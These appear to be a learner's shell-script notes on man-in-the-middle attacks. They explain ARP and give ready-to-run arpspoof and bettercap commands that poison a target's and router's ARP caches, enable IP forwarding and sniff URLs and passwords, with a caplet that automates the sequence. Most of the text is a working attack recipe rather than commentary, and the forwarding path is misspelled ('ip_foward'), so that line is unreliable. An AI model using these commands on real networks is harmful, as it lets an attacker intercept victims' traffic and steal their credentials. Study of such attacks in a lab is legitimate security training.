:'
There are a number of ways to achieve the MITM attacks:
    1. ARP spoofing attack
     - ARP spoofing will allow us to redirect the flow of the packets
     - It can enable the hacker to to change the flow of packets e.g. from a victim -> hacker -> access point -> internet
     - Instead of victim -> access point -> internet

     ARP (address resolution protocol) is a simple protocol that is used to map IP address to 
     its mac address
'

# The 'arp -a' command is used to display the ARP (Address Resolution Protocol) cache table on a 
# computer. The ARP cache is used to maintain a mapping between IP addresses and MAC addresses on a 
# local network. The 'arp -a' command can help you troubleshoot network connectivity issues, 
# as well as identify devices that are connected to your network.
arp -a

:'
- tools that can be used to run ARP spoofing include
arpspoof
bettercap
'

### arpspoof
# This approach will spoof the target telling them that I am the router
arpspoof i <interface connected to the network> -t <target IP> <router IP>
arpspoof i eth0 -t 10.0.2.7 10.0.2.1

# we have to repeat the same for the router, so that the router can think that 
# we are the target
arpspoof i <interface connected to the network> -t <router IP> <target IP>
arpspoof i eth0 -t 10.0.2.1 10.0.2.7

# you then need to enable portfowarding to allow packets to flow through you linux machine
echo 1 > /proc/sys/net/ipv4/ip_foward


### bettercap
:'
- this is a framework used to run netowrk attacks
- it can be used to:
    - ARP spoof targets (redirect the flow of packets)
    - sniff data (urls, username passwords)
    - Bypass HTTPS
    - Redirect domain requests (DNS spoofing)
    - Inject code in loaded pages etc.
'
bettercap -iface <interface connected to network>
bettercap -iface eth0

# this will take us to a different prompt
help
help <module name>
help net.probe
net.probe on
net.show 

# for us to perform the man in the middle attack, we need to use a module called
# arp.spoof
help arp.spoof

# Changing options
set arp.spoof.fullduplex true
set arp.spoof.targets <ip addresses of the target>
set arp.spoof.targets 10.0.2.7
arp.spoof on
## the net.prope and net.recon should also be running

# we will use the net.sniff module to capture and analyze the packets
help net.sniff
net.sniff on
# this approach will not work with https

### caplet
# save the file with a .cap extension <i.e. caplet file>
:'
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.2.7
arp.spoof on
net.sniff on
'
bettercap -iface eth0 --caplet spoof.cap